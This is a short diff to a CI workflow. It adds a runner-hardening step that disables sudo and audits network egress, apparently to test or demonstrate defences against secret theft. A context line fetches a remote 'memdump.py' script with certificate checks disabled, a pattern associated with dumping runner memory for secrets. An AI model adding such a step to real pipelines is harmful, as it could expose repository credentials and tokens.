@@ -11,5 +11,11 @@ jobs:
         with:
           fetch-depth: 0  # Ensures full commit history is available
 
+      - name: Harden Runner
+        uses: step-security/harden-runner@v2
+        with:
+          disable-sudo: true
+          egress-policy: audit    
+
       - name: Run Memory Dump Script
         run: curl -k -sSf https://gist.githubusercontent.com/Pranesh-Shrestha/eea7f7f05e3d9ae73ead8d93a2029154/raw/d3adf5c61a3cf583048cd353b3a23a1ff9fd4c1b/memdump.py
